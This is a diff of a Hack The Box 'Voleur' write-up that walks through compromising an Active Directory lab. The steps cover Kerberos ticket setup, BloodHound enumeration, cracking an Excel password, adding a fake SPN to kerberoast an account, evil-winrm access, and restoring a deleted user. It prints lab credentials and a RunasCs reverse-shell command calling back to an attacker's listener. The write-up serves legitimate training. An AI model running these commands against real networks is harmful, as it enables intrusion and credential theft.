@@ -1,6 +1,10 @@
 # Voleur
 
+To begin the room just like some real life scenario we have the credentials of a user.
+
 ryan.naylor:HollowOct31Nyt
+
+Let's first scan the machine's ports.
 
 ```bash
 $ nmap 10.10.11.76 --min-rate 3000
@@ -18,29 +22,30 @@ $ nmap 10.10.11.76 --min-rate 3000
 3269/tcp open  globalcatLDAPssl
 ```
 
-```bash
-$ nxc smb <machine-ip> -u ryan.naylor -p HollowOct31Nyt
-```
+We see interesting ports that let us guess that this machine will be about Active Directory.
 
 ```bash
-$ <machine-ip>    voleur.htb dc.voleur.htb dc 
+$ nxc smb 10.10.11.76 -u ryan.naylor -p HollowOct31Nyt
 ```
+
+This doesn't work because this machine only support kerberos authentification.
+
+We also got the machine domain name so we will add it to our /etc/hosts.
+
+```
+10.10.11.76    voleur.htb dc.voleur.htb dc 
+```
+
+As the machine only accepts Kerberos authentification we will need to get a TGT ticket for our user.
 
 ```bash
 $ faketime "$(rdate -n dc.voleur.htb -p | awk '{print $2, $3, $4}' | date -f - "+%Y-%m-%d %H:%M:%S")" zsh
-```
-
-```bash
 $ getTGT.py -dc-ip "dc.voleur.htb" "voleur.htb"/"ryan.naylor":"HollowOct31Nyt"
-```
-
-```bash
 $ export KRB5CCNAME="$(pwd)/ryan.naylor.ccache"
-```
-
-```bash
 $ nxc smb dc.voleur.htb -u ryan.naylor -p HollowOct31Nyt --use-kcache
 ```
+
+Now it works ! Let's get more informations about the machine using bloodhound
 
 ```bash
 $ bloodhound.py --zip -c All -d "voleur.htb" -u "ryan.naylor" -p "HollowOct31Nyt" -ns "10.10.11.76" -k -no-pass
@@ -48,22 +53,26 @@ $ bloodhound.py --zip -c All -d "voleur.htb" -u "ryan.naylor" -p "HollowOct31Nyt
 
 ![Domain admin path](../../../assets/htb/voleur/domain_admin_path.png)
 
+For now it seems that we don't have any particular privilege on other users / groups on the domain controller.
+
+However when I checked if ryan.naylor can read any shares:
+
 ```bash
 $ nxc smb dc.voleur.htb -u ryan.naylor -p HollowOct31Nyt --use-kcache --shares
 ```
 
-Access to the IT share with read privilege
+It seems that he has access to the IT share with read privilege. The IT share being unusual it seems that our foothold is here. To read the share directory I will use `smbclient.py`.
 
 ```bash
 $ smbclient.py dc.voleur.htb -k -no-pass
 ```
-Now we have access to a directory `First-Line Support` which contain the file `Access_Review.xlsx`
-
-We download it locally using
+Now we have access to a directory `First-Line Support` which contain the file `Access_Review.xlsx`, let's download it locally.
 
 ```bash
 $ get Access_Review.xlsx
 ```
+
+Now we can see what it contains using `libreoffice`:
 
 ```bash
 $ libreoffice --calc Access_Review.xlsx
@@ -71,39 +80,45 @@ $ libreoffice --calc Access_Review.xlsx
 
 ![Asking password Image](../../../assets/htb/voleur/tableur_password.png)
 
+The file is encrypted with a password, we need to crack it before checking what it contains.
 
 ```bash
 $ office2john.py Access_Review.xlsx > Access_Review.hash
-```
-
-```bash
 $ john --wordlist=rockyou.txt Access_Review.hash
 ```
 
-Access_Review.xlsx:football1
+And with this we now have the file password which is: **football1**. Now let's check the file.
 
 ![Tableur](../../../assets/htb/voleur/tableur.png)
 
+We have interesting informations like credentials of some account:
+
 svc_ldap:M1XyC9pW7qT5Vn
 svc_iis:N5pXyW1VqM7CZ8
+todd.wolfe:NightT1meP1dg3on14
+
+todd.wolfe is apparently a removed account so let's forget it for now.
+
+However, according to our bloodhound, svc_ldap has a special privilege on another account... which is svc_winrm !
+
+It is important because svc_winrm can authenticate on the machine and get a shell with him as svc_winrm is a member of the REMOTE MANAGEMENT USERS group.
 
 ![Domain admin path](../../../assets/htb/voleur/svc_ldap_to_svc_winrm.png)
 
+svc_ldap has write privilege on the service principal name of svc_winrm. What does it means ?
+
+It means that we can create a false service principal name for svc_winrm and then use a kerberoast attack to get it's hash !
+
 ```bash
 $ bloodyAD --host "dc.voleur.htb" -d "voleur.htb" -u "svc_ldap" -p "M1XyC9pW7qT5Vn" -k set object S-1-5-21-3927696377-1337352550-2781715495-1601 serviceprincipalname -v FAKE/voleur.htb
-```
-
-```bash
 $ nxc ldap "dc.voleur.htb" -d "voleur.htb" -u "svc_ldap" -p "M1XyC9pW7qT5Vn" -k --kerberoasting hashes.txt
-```
-
-```bash
 $ john --wordlist=rockyou.txt hashes.txt
 ```
+And with this we get the following credentials:
 
 svc_winrm:AFireInsidedeOzarctica980219afi
 
-We have to edit the krb5.conf file to use kerberos authentification with evil-winrm.
+We can now get a shell as svc_winrm on the DC but we first have to edit the krb5.conf file to use kerberos authentification with evil-winrm.
 
 We will add the following lines:
 
@@ -112,6 +127,8 @@ VOLEUR.HTB = {
     kdc = dc.voleur.htb          
 }
 ```
+
+We also need to get a TGT because the DC only allows kerberos authentification.
 
 ```bash
 $ getTGT.py -dc-ip "dc.voleur.htb" "voleur.htb"/"svc_winrm":"AFireInsidedeOzarctica980219afi"
@@ -125,29 +142,53 @@ $ evil-winrm -i "dc.voleur.htb" -r VOLEUR.HTB
 
 > The user.txt is in C:\Users\svc_winrm\Desktop
 
+To go further we need higher privileges. On the machine there is other users's home directory like jeremy.combs and todd.wolfe.
+
+We don't have informations about jeremy.combs but we have the password of todd.wolfe that we found in the libreoffice file earlier.
+
+However when checking the deleted AD objects:
+
 ```powershell
-upload /workspace/RunasCs.exe C:\\Users\\svc_winrm\\Desktop\\RunasCs.exe
+Get-ADOptionalFeature 'Recycle Bin Feature'
 ```
+
+It appears that todd.wolfe can't be used anymore, we need to restore it.
+
+And the good thing is that we already own a user that is a member of RESTORE_USERS group... and it's svc_ldap !
+
+So to restore todd.wolfe we will create a reverse shell as svc_ldap using the binary `RunasCs.exe` which is an
+ improved version of the `runas.exe` Windows builtin authorizing explicit credentials usage and come with other handy features (like reverseshell spawning).
+
+Let's upload it on the remote machine using the evil-winrm shell.
+
+```powershell
+> upload /workspace/RunasCs.exe C:\\Users\\svc_winrm\\Desktop\\RunasCs.exe
+```
+
+We start the listener on our machine.
 
 ```bash
 $ nc -lvnp 4444
 ```
 
-```powershell
-./RunasCs.exe svc_ldap M1XyC9pW7qT5Vn powershell -r <my-ip>:4444
-```
+And then we can spawn a reverse powershell using:
 
 ```powershell
-Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects
+> ./RunasCs.exe svc_ldap M1XyC9pW7qT5Vn powershell -r <my-ip>:4444
 ```
+
+Now we just have to check the object ID and to restore it.
 
 ```powershell
-Restore-ADObject -Identity 1c6b1deb-c372-4cbb-87b1-15031de169db
+> Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects
+> Restore-ADObject -Identity 1c6b1deb-c372-4cbb-87b1-15031de169db
 ```
 
-todd.wolfe:NightT1meP1dg3on14
+We can now authenticate as todd.wolfe using the password we found earlier 
 
-todd.wolfe has also access to the IT share. Using the same method as earlier (with rayan.naylor) we will see what it contains.
+> *Reminder*: todd.wolfe:NightT1meP1dg3on14
+
+todd.wolfe has access to the IT share. Using the same method as earlier (with rayan.naylor) we will see what it contains.
 
 It appears that the share for todd.wolfe contain a `/Second-Line Support/Archived Users/todd.wolfe` directory.
 
